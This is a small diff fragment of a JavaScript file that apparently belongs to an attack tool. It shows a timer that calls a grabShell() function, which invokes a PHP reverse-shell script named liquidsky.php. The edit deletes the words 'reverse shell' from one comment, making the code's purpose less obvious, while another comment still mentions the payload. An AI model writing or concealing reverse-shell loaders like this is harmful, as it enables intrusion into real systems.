@@ -33,7 +33,7 @@ function patience()
 	var u=setTimeout("grabShell()",5000);
 }
 
-// This function is to call the reverse shell php script (liquidsky.php).
+// This function is to call the php script (liquidsky.php).
 // currently using a reverse shell payload that will need to be modified.
 function grabShell()
 {
